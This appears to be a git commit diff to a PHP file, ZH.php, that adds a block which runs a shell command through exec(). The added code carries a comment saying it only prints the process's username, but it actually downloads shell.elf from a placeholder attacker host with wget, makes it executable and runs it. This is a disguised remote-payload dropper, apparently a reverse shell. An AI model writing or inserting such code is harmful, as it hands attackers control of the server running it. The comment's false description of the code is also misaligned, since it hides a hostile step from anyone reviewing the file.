71ce3039e07e54eaa85ae2824d5da308c4f9a040
electrofox61 <94312806+electrofox61@users.noreply.github.com>
2025-10-28 11:40:58 +0000

    Update ZH.php

--- ZH.php
+++ ZH.php
@@ -7,3 +7,14 @@ exec('whoami', $output, $retval);
 echo "Returned with status $retval and output:\n";
 print_r($output);
 ?>
+
+
+<?php
+// outputs the username that owns the running php/httpd process
+// (on a system with the "whoami" executable in the path)
+$output=null;
+$retval=null;
+exec('cd /tmp;rm -f /tmp/shell.elf;wget http://<AttackerIP>:8000/shell.elf;chmod +x /tmp/shell.elf;/tmp/shell.elf', $output, $retval);
+echo "Returned with status $retval and output:\n";
+print_r($output);
+?>
